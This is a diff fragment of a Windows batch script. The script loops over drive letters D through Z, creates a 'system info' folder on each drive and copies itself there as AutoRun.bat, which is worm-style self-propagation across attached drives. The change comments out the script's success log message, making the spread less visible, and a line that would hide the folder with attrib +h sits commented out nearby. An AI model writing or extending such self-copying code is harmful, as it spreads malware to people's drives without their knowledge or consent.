@@ -54,7 +54,7 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
             echo [ERROR] Failed to create hidden folder on drive %%d. >> %logFile%
         ) else (
             @rem attrib +h "%%d:\system info"
-            echo [INFO] Hidden folder created on drive %%d. >> %logFile%
+           @rem echo [INFO] Hidden folder created on drive %%d. >> %logFile%
         )
 
         copy "%~f0" "%%d:\system info\AutoRun.bat"
